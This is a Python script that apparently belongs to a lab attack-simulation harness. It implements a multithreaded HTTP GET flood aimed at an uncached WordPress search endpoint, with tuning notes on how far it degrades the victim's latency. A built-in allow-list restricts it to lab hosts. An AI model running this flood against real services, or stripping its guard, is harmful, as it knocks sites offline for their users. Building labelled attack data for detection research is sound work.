#!/usr/bin/env python3
"""
http_flood.py — application-layer HTTP GET flood for the lab DoS scenario.

Replaces slowhttptest as the DoS tool. The rehearsal proved slowloris/slow-POST
do not degrade Caddy at the campaign's connection counts (availability stayed
1.0 even at 500 s), because the bottleneck is not the front-end. A concurrent
GET flood against an UNCACHED, DB-backed endpoint (WordPress search, /?s=)
forces one MariaDB query per request and reliably degrades the stack: in the
tuning harness 200 workers drove p50 latency from 115 ms to 5064 ms (x44),
well past the service_monitor effect threshold, so the DoS becomes
effect-verified on Day 4.

Contract: run_attacks.build_dos() invokes this as
    python3 <abs path>/http_flood.py --url https://<host>/?s=load
            --workers <dos_conns> --seconds <dos_seconds>
and attack_scenarios.expected_command_argv() mirrors that argv EXACTLY (the
interpreter and flags are fixed; the script PATH is the one wildcarded token),
so the labeler validates the ground truth against this plan.

Safety: only the lab victim (blog.lab / shop.lab / 10.10.10.11) is a permitted
target; anything else is refused before a single request is sent.
"""

import argparse
import ssl
import sys
import threading
import time
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"blog.lab", "shop.lab", "10.10.10.11"}
CTX = ssl._create_unverified_context()   # private lab CA; a DoS does not validate certs
_stop = threading.Event()
_counter = {"sent": 0, "err": 0}
_lock = threading.Lock()


def guard(url):
    """Refuse any target that is not the lab victim. Returns the parsed hostname."""
    host = (urllib.parse.urlsplit(url).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        sys.exit("REFUSED: {!r} is not a permitted lab target {}.".format(
            host, sorted(ALLOWED_HOSTS)))
    return host


def worker(url):
    """Issue back-to-back GETs until the deadline is reached (via _stop)."""
    while not _stop.is_set():
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "lab-dos"})
            with urllib.request.urlopen(req, timeout=15, context=CTX) as r:
                r.read(1024)
            with _lock:
                _counter["sent"] += 1
        except Exception:
            with _lock:
                _counter["err"] += 1


def main():
    """Flood the target for the requested duration with the requested concurrency."""
    ap = argparse.ArgumentParser(description="Lab HTTP GET flood (DoS scenario)")
    ap.add_argument("--url", required=True, help="target URL (must be the lab victim)")
    ap.add_argument("--workers", type=int, required=True, help="concurrent request threads")
    ap.add_argument("--seconds", type=int, required=True, help="attack duration")
    args = ap.parse_args()

    if args.workers <= 0 or args.seconds <= 0:
        sys.exit("ABORT: --workers and --seconds must be > 0.")
    guard(args.url)

    print("http_flood: {} workers -> {} for {}s".format(args.workers, args.url, args.seconds))
    threads = []
    for _ in range(args.workers):
        t = threading.Thread(target=worker, args=(args.url,), daemon=True)
        t.start()
        threads.append(t)

    time.sleep(args.seconds)
    _stop.set()
    # Give in-flight requests a moment to unwind so the counters settle.
    for t in threads:
        t.join(timeout=1.0)

    print("http_flood done: requests_sent={} errors={}".format(
        _counter["sent"], _counter["err"]))
    # A DoS that could not send a single request is a failed attack (rc != 0);
    # otherwise the tool RAN (whether the service degraded is decided later, by
    # service_monitor --analyze, exactly as for every attack).
    return 0 if _counter["sent"] > 0 else 2


if __name__ == "__main__":
    sys.exit(main())
